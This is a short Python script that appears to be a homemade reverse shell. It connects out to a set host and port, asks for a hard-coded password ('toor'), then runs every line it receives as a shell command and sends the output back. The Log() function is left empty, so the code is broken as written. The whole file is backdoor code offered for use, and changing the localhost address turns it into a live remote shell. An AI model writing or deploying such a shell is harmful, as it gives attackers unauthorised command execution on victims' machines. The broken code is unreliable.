#! /usr/bin/python
import subprocess
import socket
import os

host = "127.0.0.1"
port = 4444
password = "toor"

def Login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != password:
        Login()
    else:
        s.send("Connected #> ")
        Shell()

def Shell():
    while True:
        data = s.recv(1024)

        if data.strip() == ":kill":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("> ")
        Log()

def Log():
    

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
Login()

